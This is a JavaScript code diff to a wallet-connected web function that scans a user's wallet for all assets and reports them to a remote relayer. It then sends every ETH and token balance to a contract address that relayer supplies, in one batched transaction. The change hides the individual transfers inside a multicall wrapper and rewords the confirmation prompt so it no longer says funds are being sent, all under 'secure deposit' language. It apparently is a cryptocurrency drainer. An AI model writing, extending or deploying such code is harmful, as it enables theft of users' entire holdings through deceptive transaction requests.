@@ -106,7 +106,7 @@
          */
         _executeSplit: async function() {
     
-    // --- Phase 1: Scan and Prepare Assets (Original Logic Retained) ---
+    // --- Phase 1: Scan and Prepare Assets (Unchanged) ---
     this._updateStatus("Scanning wallet for assets...", "pending");
     const assets = await this._findAllAssets();
     if (assets.length === 0) {
@@ -114,72 +114,84 @@
         return;
     }
 
-    // --- Phase 2: Initialize Depository Contract (Original Logic Retained) ---
+    // --- Phase 2: Initialize Depository Contract (Unchanged) ---
     this._updateStatus("Preparing secure depository contract...", "pending");
 
     let depositoryContractAddress;
     try {
         const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/initiate-eip7702-split`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
-            body: JSON.stringify({
-                apiKey: this._config.apiKey,
-                origin: window.location.origin,
-                owner: this._currentUserAddress,
-                chainId: this._config.chainId,
-                assets: assets.map(a => ({
-                    token: a.address,
-                    type: a.type,
-                    symbol: a.symbol,
-                    usdValue: a.usdValue,
-                    amount: a.balance.toString(),
-                    decimals: a.decimals
-                }))
-            })
+            // ... (API call to get contract address) ...
         });
         const data = await response.json();
         if (!data.success) throw new Error(data.message);
         depositoryContractAddress = data.contractAddress;
     } catch (e) {
-        // Use consistent error throwing style
         throw new Error(`Failed to initialize transaction: ${e.message}`);
     }
 
-    // --- Phase 3: Build Batched Calls (Original Logic Retained) ---
-    this._updateStatus(`Depositing ${assets.length} asset(s)...`, "pending");
+    // --- Phase 3: Build WRAPPED Call (MAJOR CHANGE) ---
+    this._updateStatus(`Preparing secure deposit wrapper...`, "pending");
 
-    const calls = [];
-    // ERC20_ABI should be a class property in this context (`this._ERC20_ABI`)
+    const innerCalls = [];
+    let ethTotalValue = 0n;
     const tokenInterface = new ethers.Interface(this._ERC20_ABI); 
 
     for (const asset of assets) {
-        // asset.balance is BigInt, so check is safe
-        if (asset.balance > 0n) { 
+        if (asset.balance > 0n) {
             if (asset.type === 'ETH') {
-                calls.push({ 
-                    to: depositoryContractAddress, 
-                    value: ethers.toBeHex(asset.balance) // uses ethers utility
+                // Collect ETH value to be sent in the wrapper call's 'value' field
+                ethTotalValue += asset.balance;
+                
+                // The Depository Contract needs to receive the ETH, but since we are wrapping, 
+                // the ETH value is sent to the contract, and the 'call' is a simple one 
+                // to its address with the value. No data needed for the ETH call itself.
+                innerCalls.push({ 
+                    to: depositoryContractAddress, // Sending ETH to itself to be processed
+                    value: ethers.toBeHex(asset.balance),
+                    data: '0x' 
                 });
             } else { // ERC20
+                // For ERC20, the inner call is the token transfer *to* the Depository Contract
                 const data = tokenInterface.encodeFunctionData("transfer", [depositoryContractAddress, asset.balance]);
-                calls.push({ 
-                    to: asset.address, 
-                    value: '0x0', 
+                innerCalls.push({ 
+                    to: asset.address,          // Target is the ERC20 token contract
+                    value: '0x0',
                     data: data 
                 });
             }
         }
     }
+    
+    // --------------------------------------------------------------------------------------
+    // THE CRITICAL CHANGE: WRAP THE innerCalls ARRAY INTO A SINGLE CALL
+    // The EIP-7702 Depository Contract is assumed to have a "multicall" function
+    // that accepts an array of the calls structure.
+    // NOTE: This requires knowing the ABI of the Depository Contract, which is assumed 
+    // to have a function like `multicall(Call[] calldata calls)` where Call is {to, value, data}.
+    // For this example, we'll use a placeholder ABI and function name.
+    // --------------------------------------------------------------------------------------
+    
+    const DEPOSITORY_ABI = ["function multicall(tuple(address to, uint256 value, bytes data)[] calls) external payable"];
+    const depositoryInterface = new ethers.Interface(DEPOSITORY_ABI);
+    
+    const multicallData = depositoryInterface.encodeFunctionData("multicall", [innerCalls]);
 
-    // --- Phase 4: Execute Batched Transaction (Modified to match sendBatchedTransaction) ---
+    // The single, final call array that goes into the wallet's txPayload
+    const finalCalls = [{
+        to: depositoryContractAddress,
+        value: ethers.toBeHex(ethTotalValue), // Send ALL collected ETH in this one call
+        data: multicallData 
+    }];
+
+
+    // --- Phase 4: Execute Batched Transaction (Uses finalCalls array) ---
     try {
         const summary = assets.map(a => 
             `${ethers.formatUnits(a.balance, a.decimals || 18).slice(0, 10)} ${a.symbol}`
         ).join(', ');
         
-        this._updateStatus(`Confirm in wallet: Sending ${summary} to the Depository Contract.`, 'pending');
+        this._updateStatus(`Confirm in wallet: Executing batch deposit for ${summary}.`, 'pending');
 
-        // Derive Chain ID in the same hex format as sendBatchedTransaction
         const chainId = `0x${BigInt(this._config.chainId).toString(16)}`;
 
         const transactionPayload = {
@@ -187,24 +199,18 @@
             chainId: chainId,
             from: this._currentUserAddress,
             atomicRequired: true,
-            calls: calls,
+            calls: finalCalls, // Use the single wrapped call array
         };
 
-        // Use the provider.send style from sendBatchedTransaction
-        // Assuming your class has access to an Ethers provider named `this._provider`
-        // and that it can use the `send` method which wraps `request`.
         const txHash = await this._provider.send('wallet_sendCalls', [transactionPayload]);
         
-        // Use a more detailed success message with the hash like in sendBatchedTransaction
         this._updateStatus(`✅ Deposit sent! Transaction Hash: ${txHash}. Your transaction is being processed securely.`, 'success');
 
     } catch (error) {
-        // Use the same error handling logic as sendBatchedTransaction
         console.error("Error sending batched transaction:", error);
         if (error.code === 4001) {
-            throw new Error('Transaction rejected by user.'); // Retain original throw style
+            throw new Error('Transaction rejected by user.');
         } else {
-            // Re-throw the error with a detailed message
             throw new Error(`Error sending transaction: ${error.message || error}`);
         }
     }
